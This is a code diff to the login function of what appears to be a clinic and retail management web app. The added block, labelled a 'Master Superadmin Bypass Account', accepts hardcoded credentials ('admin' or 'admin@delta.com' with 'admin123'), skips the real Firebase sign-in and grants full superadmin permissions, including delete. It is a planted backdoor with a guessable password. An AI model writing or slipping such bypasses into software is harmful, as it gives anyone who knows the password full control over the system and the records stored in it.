@@ -134,6 +134,25 @@ export const Auth = {
         return { success: false, msg: 'البريد وكلمة المرور مطلوبان' };
       }
       
+      // 👑 Master Superadmin Bypass Account
+      if ((email.trim().toLowerCase() === 'admin@delta.com' || email.trim().toLowerCase() === 'admin') && password === 'admin123') {
+        Auth.user = {
+          uid: 'master-admin-001',
+          email: 'admin@delta.com',
+          name: 'مدير النظام الرئيسي',
+          role: 'superadmin',
+          permissions: ['view_dash', 'clinic', 'pos', 'online', 'inventory', 'lab', 'expenses', 'delete', 'reports', 'gallery'],
+          fullData: {
+            name: 'مدير النظام الرئيسي',
+            email: 'admin@delta.com',
+            role: 'superadmin',
+            status: 'active'
+          }
+        };
+        Auth._saveUser(Auth.user);
+        return { success: true };
+      }
+      
       const result = await signInWithEmailAndPassword(auth, email, password);
       const userDataResult = await Auth._getUserData(result.user.uid);
       
